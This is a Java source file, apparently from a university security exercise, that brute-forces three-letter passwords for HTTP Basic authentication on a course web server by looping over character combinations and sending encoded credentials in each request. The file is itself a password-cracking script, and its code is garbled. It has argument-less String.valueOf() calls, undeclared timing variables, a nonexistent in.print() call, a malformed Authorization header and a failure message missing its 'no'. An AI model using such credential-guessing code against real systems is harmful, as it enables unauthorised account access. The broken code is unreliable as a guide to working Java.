import java.io.*;
import java.net.*;
import java.security.*;
import java.math.*;
import java.*;
import java.util.*;


public class BruteForce
{
    public static void main (String args[]) throws Exception {
	String retVal = null, StatusCode = "HTTP/1.1 200 OK";
    int found = 0, count = 0, ctrl = 0, flag = 0;


          stime = System.currentTimeMillis();
         char[] c = new char[3];
         System.out.println("Cracking password by Brute Force...");

	     for(int i=65; ((i<123) && (found == 0)); i++)
	     {
	       for(int j=65; ((j<123) && (found == 0)); j++)
	       {
	         for (int k=65; ((k<123) && (found == 0)); k++)
	         {
               try {
                   if (ctrl == 0) {
                      c[0] = '\0';
                      c[1] = '\0';
                   } else if ((ctrl == 1) && (flag == 0)) {
                     c[0] = '\0';
                   }
                      c[2] = (char)(k);

	               
                   URL yahoo = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
                   URLConnection yc = yahoo.openConnection();

                   
                   String authString = ":" + String.valueOf();
                   String auth = new bf.misc.BASE64Encoder().encode(authString.getBytes());
                   yc.setRequestProperty("Authorization", " " + auth);
                   count++;

                   
                   BufferedReader in = new BufferedReader(
                                           new InputStreamReader(
                                           yc.getInputStream()));

                   String inputLine;
                   while ((inputLine = in.readLine()) != null){
                           System.out.println(inputLine);
                            etime = System.currentTimeMillis();
                           System.out.println("Password found -- " + String.valueOf());
                           System.out.println("Time used = " + ((etime - stime)/1000) + " sec");
                           System.out.println("# of attempt = " + count);
                           System.out.println("End of cracking!");
                           found = 1;
                   }
                   in.print();

	           } catch (Exception ex) {}
	         }
	         ctrl = 1;
             c[1] = (char)(j);
           }
           ctrl = 2;
           flag = 1;
           c[0] = (char)(i);
         }
         if (found == 0){
           System.out.println("Sorry,  password found.");
           System.out.println("# of attempt = " + count);
           System.out.println("End of cracking!");
         }
    }
}